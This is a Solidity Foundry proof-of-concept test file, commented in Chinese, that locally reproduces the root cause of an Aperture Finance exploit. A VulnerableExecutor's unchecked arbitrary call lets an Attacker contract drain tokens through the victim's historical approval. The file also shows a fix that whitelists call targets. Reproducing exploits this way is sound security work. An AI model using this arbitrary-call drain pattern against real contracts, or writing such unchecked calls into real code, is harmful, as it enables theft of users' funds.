// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// =============================================================================
// Aperture Finance ~$3.67M 漏洞 — 可运行 Foundry PoC(复现根因,不联网)
//
// 根因(见 Aperture-3.67M-approval.md §2):V3/V4 执行合约的自定义 swap 函数把
// 调用 target / calldata 完全交给调用者控制且不做白名单校验。攻击者把 target
// 指向某个 ERC-20 代币合约、calldata 构造为 transferFrom(victim, attacker, amount),
// 由于该低级 call 在执行合约(victim 已 approve 的 spender)上下文中发出,代币合约
// 看到的 msg.sender 是执行合约本身,于是认可受害者此前的历史授权 —— 资产被抽走。
//
// 本 PoC 忠实复现:
//   ① VulnerableExecutor.execute(target, data, expectedOutput) 不校验 target;
//   ② victim 先 approve(executor, ...) 一个 mock ERC-20(真实由 victim 发起);
//   ③ attacker 调用 executor,让它对 token 发起 transferFrom(victim, attacker);
//   ④ 断言 attacker 余额增加、victim 被抽空;
//   ⑤ 对照:SafeExecutor 加了 target 白名单 → 同样的攻击 revert。
//
// 不 import forge-std;断言用 require;forge test 自动发现 testXxx()。
// 为了让 victim 真实地用自己身份调用 approve(不用 cheatcode / vm.prank),
// 我们让一个独立的 Victim 合约充当受害者:它持有代币、亲自 approve、亲自接收资金。
// =============================================================================

// ------------------------- 最小 ERC-20(忠实 transferFrom + allowance)-------
contract MockERC20 {
    string public name = "Mock WBTC";
    string public symbol = "mWBTC";
    uint8 public decimals = 8;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount; // 以 msg.sender(=victim)记账
        return true;
    }

    // transferFrom 信任 msg.sender(=执行合约)对 from 的 allowance —— 被滥用之处
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        require(balanceOf[from] >= amount, "balance");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ------------------------- 受害者(真实发起 approve 的实体)-------------------
contract Victim {
    function approveSpender(MockERC20 token, address spender, uint256 amount) external {
        token.approve(spender, amount); // msg.sender == this(Victim),忠实授权
    }
}

// ------------------------- 脆弱执行合约(arbitrary-call,无 target 校验)------
// 对应报告 0x1d33 / 0x67b34120 的"自定义 swap":target 与 calldata 由调用者
// 完全控制,且未做白名单。低级 call 在本合约上下文执行 —— victim 对本合约的
// 授权被借用。expectedOutput 由调用者传入(报告 §2(3):攻击者自填以绕过校验)。
contract VulnerableExecutor {
    function execute(address target, bytes calldata data, uint256 expectedOutput)
        external
        returns (bytes memory)
    {
        expectedOutput; // 攻击者声明的"预期输出",合约并不真正校验
        (bool ok, bytes memory ret) = target.call(data); // <== 任意调用,无 target 校验
        require(ok, "call failed");
        return ret;
    }
}

// ------------------------- 修复对照:加 target 白名单 ------------------------
contract SafeExecutor {
    mapping(address => bool) public allowedTarget;

    constructor(address router) {
        allowedTarget[router] = true; // 仅信任白名单路由,token 合约不在内
    }

    function execute(address target, bytes calldata data, uint256)
        external
        returns (bytes memory)
    {
        require(allowedTarget[target], "target not whitelisted"); // <== 根因修复
        (bool ok, bytes memory ret) = target.call(data);
        require(ok, "call failed");
        return ret;
    }
}

// ------------------------- 攻击者合约 --------------------------------------
contract Attacker {
    // 抽到攻击者自己名下;返回值用于断言
    function steal(address executor, address token, address victim, uint256 amount) external {
        bytes memory data = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", victim, address(this), amount
        );
        VulnerableExecutor(executor).execute(token, data, type(uint256).max);
    }
}

// =============================================================================
// 测试(forge 自动发现 testXxx;require 断言;不 import forge-std)
// =============================================================================
contract ApertureExploitTest {
    uint256 constant VICTIM_BAL = 36918976; // ~36.918 WBTC(8 位精度,呼应链上 0xdc0de334)

    // ① 核心:任意调用借历史授权抽空受害者
    function testArbitraryCallDrainsVictimViaHistoricalApproval() external {
        MockERC20 token = new MockERC20();
        Victim victim = new Victim();
        VulnerableExecutor executor = new VulnerableExecutor();
        Attacker attacker = new Attacker();

        token.mint(address(victim), VICTIM_BAL);

        // victim 在历史上对执行合约做了授权(本案攻击面;由 victim 亲自发起)
        victim.approveSpender(token, address(executor), type(uint256).max);

        // 前置断言
        require(token.balanceOf(address(victim)) == VICTIM_BAL, "pre: victim funded");
        require(token.balanceOf(address(attacker)) == 0, "pre: attacker empty");
        require(
            token.allowance(address(victim), address(executor)) == type(uint256).max,
            "pre: approval set"
        );

        // 攻击:executor 被诱导对 token 发起 transferFrom(victim, attacker)
        attacker.steal(address(executor), address(token), address(victim), VICTIM_BAL);

        // 后置断言:受害者被抽空,攻击者拿走全部
        require(token.balanceOf(address(victim)) == 0, "victim NOT drained");
        require(token.balanceOf(address(attacker)) == VICTIM_BAL, "attacker did NOT gain");
    }

    // ② 对照:加了 target 白名单后,同样的攻击 revert
    function testWhitelistBlocksAttack() external {
        MockERC20 token = new MockERC20();
        Victim victim = new Victim();
        Attacker attacker = new Attacker();
        // 白名单仅含一个无关的"路由"地址,不含 token
        SafeExecutor safe = new SafeExecutor(address(uint160(0xDeaDBeef))); // 无关"路由"地址

        token.mint(address(victim), VICTIM_BAL);
        victim.approveSpender(token, address(safe), type(uint256).max);

        bytes memory data = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            address(victim), address(attacker), VICTIM_BAL
        );

        // 期望 revert:target(token)不在白名单
        (bool ok, ) = address(safe).call(
            abi.encodeWithSignature(
                "execute(address,bytes,uint256)", address(token), data, type(uint256).max
            )
        );
        require(!ok, "whitelist did NOT block the attack");

        // 资金未动
        require(token.balanceOf(address(victim)) == VICTIM_BAL, "victim funds moved despite whitelist");
        require(token.balanceOf(address(attacker)) == 0, "attacker gained despite whitelist");
    }
}
